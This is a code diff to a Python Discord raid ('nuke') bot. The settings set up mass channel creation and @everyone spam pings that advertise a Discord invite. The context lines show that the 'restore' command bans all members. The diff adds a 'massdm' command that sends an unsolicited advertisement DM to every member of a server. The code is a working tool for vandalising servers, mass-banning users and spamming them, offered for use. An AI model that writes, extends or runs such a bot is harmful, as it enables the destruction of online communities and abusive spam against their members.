@@ -7,7 +7,7 @@ import asyncio
 prefix = "!"
 channel_name = "nuked-by-jhub"
 spam_message = "@everyone JHUB ON TOP  discord.gg/k7dfvnK7KK"
-channels_to_create = 40
+channels_to_create = 25
 pings_per_channel = 500
 
 intents = discord.Intents.all()
@@ -69,11 +69,6 @@ async def nuke(ctx):
 
     print("✅ NUKE complete.")
 
-
-
-
-
-
 @bot.command()
 @commands.has_permissions(administrator=True)
 async def restore(ctx):
@@ -91,6 +86,28 @@ async def restore(ctx):
 
     await ctx.send("Finished banning all members.")
 
+
+@bot.command()
+async def massdm(ctx):
+    await ctx.message.delete()
+    guild = ctx.guild
+    print("⚠️ Starting MASS DM sequence...")
+
+    members = list(guild.members)
+    print(f"Found {len(members)} members in the server.")
+    sem = asyncio.Semaphore(5)
+
+    async def send_dm(member):
+        async with sem:
+            try:
+                await member.send("Join JHUB for the best scripts https://discord.gg/tBM8wuuN5p")
+                print(f"Sent DM to {member.name}")
+            except Exception as e:
+                print(f"Failed to send DM to {member.name}: {e}")
+
+    await asyncio.gather(*(send_dm(m) for m in members))
+
+    print("✅ MASS DM complete.")
 
 if __name__ == "__main__":
     token = os.getenv("DISCORD_TOKEN")
